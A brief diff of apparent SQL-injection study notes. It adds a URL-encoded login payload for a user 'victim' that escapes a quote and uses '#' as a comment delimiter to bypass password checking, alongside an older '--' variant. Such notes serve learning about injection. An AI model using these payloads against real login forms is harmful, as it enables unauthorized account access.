@@ -1,2 +1,6 @@
 username=victim&password=%27--%27
 #username=victim and password='--'
+
+username=victim&password=%27%5C%27%20or%201%23
+#username=victim and password='\' or 1#
+  this is because pound is comment delimiter
